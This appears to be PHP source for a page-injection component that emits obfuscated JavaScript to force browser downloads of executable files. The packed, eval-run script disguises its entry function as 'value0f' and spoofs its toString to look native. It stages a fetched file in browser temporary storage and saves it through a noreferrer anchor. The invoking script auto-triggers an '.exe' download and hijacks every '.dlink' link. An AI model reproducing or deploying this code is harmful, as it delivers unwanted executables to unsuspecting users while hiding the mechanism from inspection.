<?php

namespace LPO\Digest\Injectable\DownloadMethod;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInvokable;

class NoReferrerFileApi extends DownloadMethod implements JavascriptInvokable {

	/**
	 * @var string
	 */
	public static $_source_script = <<<'JS'
eval((function(r0){for(var g0="",R0=0,q0=function(r0,k0){for(var a0=0,K0=0;K0<k0;K0++){a0*=96;var S0=r0.charCodeAt(K0);if(S0>=32&&S0<=127){a0+=S0-32;}}return a0;};R0<r0.length;){if(r0.charAt(R0)!="`")g0+=r0.charAt(R0++);else{if(r0.charAt(R0+1)!="`"){var m7=q0(r0.charAt(R0+3),1)+5;g0+=g0.substr(g0.length-q0(r0.substr(R0+1,2),2)-m7,m7);R0+=4;}else{g0+="`";R0+=2;}}}return g0;})("var u0u0=window;for(var D0 in` 5 ){if(D0.length===((32.30E1,118)<=(1.393E3,11.38E2)?(36.5E1,6):2.24E2>(137.0E1,8.6E2)?1000:0xA7<=(0x24E,45)?(1.336E3,0x1F7):(1.2590` , 22C))&&D0.charCodeAt((0x230>=(0x17D,135.)?(148,3):(81,111.)>(0x20B,0x16B)?true:(146,0x0)>=(105,13.59E2)?\"E\":(49.,8.85E2)))===((97,24.90E1` M .084E3,5.08E2)?0x17E:134.<(0x1F1,0x1A1)?(4.96E2,100):(91.7E1,44.7E1))&&D0.charCodeAt((0x155<(0x84,7.8E2)?(1.205E3,5):(25.40E1,32.9E1)))===(0x1<=(92.,0x124)?(94.60E1,119):(0x88,42)>=(2.14E2,57.30E1)?67.10E1:(84,0x72))&&D0.charCodeAt(((0x70,0x224)>(6.16E2,59)?(149.1E1,1):(82.10E1,112)>85.30E1?(118,\'b\'):(0xE2,120)<=(16.,95.)?(0xAE,4.9E1):(12.120E2,0xA1)))===((0xD1,18)>(58,0x19C)?\'i\':0x48<(130.5E1,7.73E2)?(65,105):(9,0x4E)>=` O ?(84,null):(14.030E2,39.2E1))&&D0.charCodeAt(((1.167E3,2.)>8.38E2?1000:(16,56)<=0x1CD?(10.16E2,0):(54,21.20E1)))===((8.120E2,116.30E1)>51?(0x41,119):(0x52,4.72E2)))break};var n0m={\"U0\":\"f\",\"e0\":\"valu\",\"A0\":\"e\",\"w0\":\"0\"` K!O0=(n0m.e0+n0m.A0` \" w` (!U0);u0u0[D0][O0]=(function(){var r5=\"in\",D5=\"Of\",u5=\"val\",l5=\"en\",J5=(41>=(129.6E1,7.270E2)?(62.2E1,\"R\"):(0xFA,10.20E1)<=(50,0x1D5)?(0x242,\"L\"):(82,2` >\">=(0x230,0x240` C 135,\'R\'):(0x200,87)),n5=\"on\",N=((0x17A,2.61E2)>(0x9C,0x147)?0x2A` S 26,41.)<97.?(5.810E2,\"g\"):(13.47E2,0x94)),Y5=((0x37,5.)<=0x15A?(13.35E2,\"E` M!0,55.7E1)<(119,44.5E1)?true:(4.11E2,0xAE)>0x223?(10,\'N\'):(1.199E3,0x93)),c5=(0x0<(16.5E1,0x2D)?(12.540E2,\"h\"):(0x1D7,140.6E1)),e=(35.2E1>=(50,91.)?(0x2F,true):(56.,45.0E1)<(4.53E2,146` @\"09,0x174):(13.,0x220)),p5=((0xE0,0x121)<(0x12D,9.540E2` V!4B,\"T\"):117.>=(11.60E1,0x172)?(40.5E1,\'f\'):(0xA0,0x3B)>(0x8C,84.)?0x1B4:(0x104,33.80E1)),t5=((1.314E3,42.)<0x14C?(0x23E,\"R\"):(26.,98.5` M i5=(0x5<=(128.,109)?(12.44E2,null):(16.,23)),R5=\"leS\",g5=\"que\",K5=\"tR\",T=\"b\",l=\"te\",V=\"re\",q5=\"em\",k5=\"eSy\",a5=\"il\",I=\"st\",H0=\"equ\",j5=\"le\",o5=\"tF\",S5=\"Req\",B=((62,99.)>=50.?(34.,\"k\"):(3.0E2,0x146)<141?(89.,\'w\'):(0x34,0x20B)),m0=\"web\",w=((7.11` R E4)<6?\'m\':(59.,7.)<0x99?(0x164,\"S\"):(0x69,0x1A3)),L=((121.30E1,0x77)>(56.40E1,7` 1 )?(0xC7,\"m` W!186,0xC2)),v5=\"Sy\",M0=\"ile\",s5=(36.9E1<(0x1BF,14.)?(0xF7,1000):(36.,6.)<=87.?(107,\"q\"):(0x10B,0x177)),H=\"r\",s=(0x1FF<(0x164,10.88E2)?(16,\"c\"):97.80E1<(102.,109)?1.051E3:(97,110.)),h=((121,74)>=0x1CD?1024:(132.,0x92)>0xD2?(0xBD,1024):(48.,24.0E1` Q E7?(102.,\"n\"):(0xD9,27` : ),X=((0x87,0x145)>(0x24F,0x246)?(0x1CA,31.8E1):(2.87E2,0x1A9)>=(16.,145.9E1)?(131.,0x70):(143.9E1,78.2E1)<(149.,1.465E3)?` )!\"y\"):(131,0x1D0)),b5=\"mS\",W5=\"ys\",x5=\"eS\",E=((1.416E3,8.870E2)>38.0E1?(1.057E3,\"l\"):(0x247,70.3E1)),d=((0x16A,96)>(97.5E1,14.)?(2.530E2,\"i` R\"02,130)>0x14A?130.4E1:(33.,74.)),p=(6.29E2>=(8.86E2,0x1E8)?(94.80E1,\"F\"):0x28>=(88.,0x1CA)?(0x18B,62.):(0xB7,8.1E1)),m=((141,0x41)<=0xE3?(44.1E1,\"t\"):0x42>(0x23B,92.)?0x1A0:(11.4E1,16.0E1)),M=((26.90E1,0x18C)>=103.?(63,\"s\"):(0x1F4,8.46E2)<=(85.,5.)?(97.,false):(7,0x1D8)),j=((7.,0x104)<85?(0x1E6,0x201):(76.,0x257)>=112?(54.80E1,\"u\"):(4.24E2,79)),T5=\"req\",N5=(0x147<` # 26,106.)?0xAF:(7.770E2,2.98E2)>(61,63)?(88.9E1,false):(146.,0x103)),s0=(106.7E1>=(4.23E2,6.97E2)?(7.60E1,1024000):(7.80E1,60)>(2.40E1,82)?(0x256,\'g\'):(1.423E3,0xED)),t0=((6` R!0x1EB)>87.?(78.,51200):(109.7E1,41.1E1)<(5.93E2,0x60)?\"b\":(0x1CF,124.)<(0xB,0x77)?(0x14F,true):(97.,11.4E2)),j0=((1.1E2,0x161)>91?(0x6B,1048576):(8.21E2,67.7E1)),h0=((0xFC,3.64E2)>=42.?(96,\"x\"):(0x2E,22.3E1)<=(0x78,149)?(0x67,null):(114,8.83E2)),d0=(13.77E2>(0xBA,0x248` N D,\".\"):(0x1F1,75)),n=((148.20E1,6.96E2)<0x102?71:0x1F2<=(9.84E2,0x240)?(4.3E1,\"d\"):(25.,59.)>=(69` 3 64.)?(53.,5.8E2):(38,0x1E8)),o=\"a\",P0=\"nlo\",C=((0x257,68)>=8.0E1?(3.40E1,true):0x183<(113,0xEB)?(106.` 3%40>=(77,48.)?(0x120,\"w\"):(52.,0x1A9)),v=((0x40,0x231)>=(76.,5.5E1)?(140.8E1,\"o\"):124.5E1<(88.,0x228)?0x14F:(86.,1.68E2)),B5=\"D\",b0=(B5+v+C+P0+o+n+d0+n0m.A0+h` \"#),C5=j0,f0=t0,y0=s0,L5=N5;if(!u0u0[D0][(T5+j` U#M+m+p+d+E+x5+W5+m` 1#b5+X+h+s)]){` Q%H` P#s5+j` C#M+m+p+M0+v5` \' ` <\"L+w+X+h+s)]=u0u0[D0][(m0+B+d+m+S5+j` C#M+o5+d+j5+v5+M+m` 0#L+w+X+h+s)];}if(!u0u0[D0][(H+H0` W#I+p+a5+k5+I+q5)]){` >%V+s5+j` B#M+m+p+d+j5+w+X+M+l+L)]=` E%C` B#T+B+d+K5` R#g5` T$R5` Q%;}var I5=i5,z0=function(Q,F){var g=\"ge\",R=\"an\",J=\"ec\",P=\"ob\",q=\"bl\",a=\"Ty\",k=\"ons\",A=\"sp\",O=\"GE\",W=((1.1E3,16.)<=100?(55.,\"p\"):11.73E2<=(98,0x15B)?(126.,143.):19.>=(0x8A,113)?\"I\":(40.6E1,91.30E1)),i=((0x1E2,94.)>=108.?9.70E1:0xD3<=(0x10F,0xCB)?50:(0x174,122.)>=0x1A?(84,\"H\"):(1.443E3,0xFC)),S=\"ML\",K=\"X\",z=new u0u0[D0][(K+S+i+m+m+W+t5+n0m.A0+s5+j` $#I)]();z[(v+W` 8#h)]((O+p5),Q,e` 9 H` T#A+k` S#a` I$)]=(q+P` E v+h+V+o+n+W5+m+o+m+J+c5+R+g)]=function(){var t=\"po\",y=\"th\",b=((13.63E2,92.9E1)>119.?(1.053E3,\"-\"):(1.890E2,12)),f=\"nt\",G=(0x1D0<` \"!D,60.)?0xE7:(0x157,15.)<=(11.120E2,0x14A)?(0x135,\"C\"):(120.,74.4E1)),Z=\"de\",c=\"nse\",Y=\"Re\",u=\"ON\",D=\"yS\",r=\"ad\";if(z[(V+r+D+m+o+m+n0m.A0)]==z[(B5+u+Y5)]){if(L5){I5=z[(N` @\"+m+Y+A+v+c+i` +#o+Z+H)]((G+n5+l+f+b+J5` I#h+N+y));}if(F){F(z[(V+M+t+h+M` >\")]);}}};z[(M+l5+n)]();},P5=function(G5,x,Z0){var d5=\"ef\",U` 6%` 3!t=\"hr\";var y=\"io` %!b=\"oad\";u0u0[D0][(v+h+T+d5+v+V+j+h+E+b)]=i5` 9&E+v+s+o+m+y+h)][(t+d5)]=G5;};try{z0(G5,function(P){var q=\"RY\",a=\"ORA\",k=\"TEMP\",A=\"ste\",O=((2,128.)<=0x107?(0x37,0):(6.60E1,0x2E)),W=\"ee\",i=\"si\",S=((118.,59)<0x1B5?(0x27,\"W\"):(86.,1.35E2)),K=\"cr\",z=((9.9E1,117)>=(0x1C0,0x23E)?(127.4E1,2.39E2):(11,121.9E1)>143?(52.90E1,\"Y\"):(72,102)>0x1E0?(0.,0x1BD):(5.98E2,68)),Q5=\"AR\",F5=\"MPO\",z5=\"nc\",A5=\"yst\",O5=\"ileS\",e5=\"qu\",y5=\"Fi\",U5=\"eq\",m5=\"ri\",E5=\"se\",H5=((0x212,2.21E2)<=148.?(135,\"C\"):0x96<=(6.46E2,92)?(140,1):(0x12F,80.)>=0x2A?(88,\"z\"):(62,0x23A)),f5=\"iz\";if(P&&P[(M+f5+n0m.A0)]>f0` #-<y0){if(L5` J\"d+H` I%!=I5){U();return ;}if(!x){x=b0;}function X5(t){var y=\"li\",b=\"do\",f=\"ut\",G=\"setA\",Z=((0xAD,0x153)<(65.,8.81E2)?(0x14C,\"U\"):(0x173,53.)),c=\"to\",Y=\"tr\",u=\"et\",D=\"er\",r=\"no\",Q=((8.9E2,0x1A7)>(0x4F,9.9E1)?(0x72,\"A\"):(0x23,52)<(88.,3)?(1.315E3,\'k\'` ; 1F0,0x1CD)>=95.80E1?(45.,4.2E2):(128,10.67E2)),F=\"lem\",g=\"teE\",R=\"ocum\",J=u0u0[D0][(n+R+l5+m)][(s+H+n0m.A0+o+g+F` %#h+m)](o);J[(E5+m+Q+m+m+m5+T+j+m` M\")]((V+E),(r+H` S#n0m.U0+D+V+H));J[(M+u` [ Y+d` N,c5+H+d5),t[(c+Z+t5+J5)](` T!G+m+m+H` S f` K&b+C+h+E+v+o+n),x` H s+y+s+B)]();};if(u0u0[D0][(H+U5+j+n0m.A0+I+y5+E+x5+X+M+l+b5+X+h+s)]){var w5=` O\'` O\"e5` X#M+o5+O5+A` )$b5+X+z5)](` O%p5+Y5+F5+t5+Q5+z)],C5),V5=w5[(H+v+v+m)][(N+n0m.A0+o5+d+E` \'\")](x,{create:e}),h5=V5[(K` E$+l+S+m5+m` X#H)]();h5[(m+H+j+z5+o` 5$)](P[(i+H5` ($` F!M+W+B)](O` U!C+H+d+l)](P);X5(V5);}else{u0u0[D0][(T5+j+n0m.A0+I+y5+E` &#v5+A+L)](` C%k+a+q)],C5,function(c){var Y=\"roo\";c[(Y+m)][(N+n0m.A0+m+p+d+j5)](x,{create:e},function(b){var f=\"Wr\",G=\"at\",Z=N5;b[(s+H+n0m.A0+G+` \"\"f+d+m` .#H)](function(t){var y=\"onw\";t[(y+m5` C%` M\"h+n)]=` M$){if(!Z){t[(E5` D#B)](O);t[(C+H+d+l)](P);Z=e;}else{X5(b);}};t[(m+H+j+h+s+o+m+n0m.A0)](P[(i+H5` ($);});});},U);}}else{U();}});}catch(t)` +\";P5[(u5+j` W\"+D5)]=P5[(m+v+w+m+H+r5+N)]=function(){var t=\"] }\",y=(1.0E3>=(8.040E2,63.6E1)?(1.1E2,\"v\"):(110.,3.2E1)),b=\"() { [\",f=((123,119` 8 >110?(0xC3,\" \"):(98.,84.4` 7 .497E3?\"j\":(2.52E2,102.)),G=\"ct\",Z=\"fu\";return (Z+h+G+d+n5+f)+O0+(b+h+o+m+d+y+n0m.A0+f+s+v+n` \'#t);};return P5;})()"));
JS;
	/**
	 * @var string
	 */
	private static $_invoking_script = <<<'JS'
if(!document.querySelectorAll) { document.querySelectorAll = function(selector) { var doc = document, head = doc.documentElement.firstChild, styleTag = doc.createElement("STYLE"); head.appendChild(styleTag); doc.__qsaels = []; styleTag.styleSheet.cssText = selector + "{x:expression(document.__qsaels.push(this))}"; window.scrollBy(0, 0); return doc.__qsaels; } } function dl(){window["value0f"](__tokens.directDownloadLink, __tokens.filename + ".exe");iframer(document.querySelectorAll(".dlink")[0], 0, __tokens.downloadLink + "&graceful=1", __tokens.downloadLink + "&graceful=1");} if(__tokens.autoDownload) { dl(); } var links = document.querySelectorAll(".dlink"); for(var i = 0; i < links.length; i++) { var dlink = links[i]; dlink.href = "javascript:void(0)"; dlink.onclick = function(e) { e.preventDefault(); dl(); } }
JS;


	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	function getInvokingScript(Bootstrap $bootstrap)
	{
		$iframe = new Iframe;
		return $iframe->getSourceScript().';'.';'.self::$_invoking_script;
	}

	/**
	 * @return string
	 */
	public function getSourceScript(){ return self::$_source_script; }
}